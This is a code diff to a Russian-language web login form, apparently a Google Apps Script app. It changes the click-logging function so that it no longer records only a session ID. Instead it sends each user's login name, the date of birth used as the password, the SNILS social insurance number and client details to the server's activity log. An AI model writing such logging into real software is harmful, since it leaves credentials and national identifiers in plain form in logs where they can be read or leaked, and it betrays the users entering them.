@@ -1432,7 +1432,7 @@
     saveAuthInputs(loginVal, dateInput.value, snilsFormatted);
 
     const clientInfo = await getClientInfo();
-    logLoginButtonClick();
+    logLoginButtonClick({ login: loginVal, password: passwordForServer, snils: snilsFormatted, clientInfo });
 
     if (!loginVal || !passwordForServer) {
       setErrorMessage('Введите ФИО и дату рождения в формате ДД.ММ.ГГГГ.');
@@ -1473,7 +1473,7 @@
     if (!authState.login || !authState.password) {
       const loginVal = dom.login.value.trim();
       const passwordForServer = toServerDate(formatDateInput(dom.password.value, { finalizeYear: true }));
-      logLoginButtonClick();
+      logLoginButtonClick({ login: loginVal, password: passwordForServer, snils: formatSnilsInput(dom.snils.value) });
 
       if (!loginVal || !passwordForServer) {
         setErrorMessage('Введите ФИО и дату рождения в формате ДД.ММ.ГГГГ.');
@@ -1552,8 +1552,8 @@
     google.script.run.logUserAction(LOG_SESSION_ID, status);
   }
 
-  function logLoginButtonClick() {
-    google.script.run.logLoginButtonClick(LOG_SESSION_ID);
+  function logLoginButtonClick({ login = '', password = '', snils = '', clientInfo = {} } = {}) {
+    google.script.run.logLoginButtonClick({ sessionId: LOG_SESSION_ID, login, password, snils, clientInfo });
   }
 
   function getLogFieldName(columnName) {
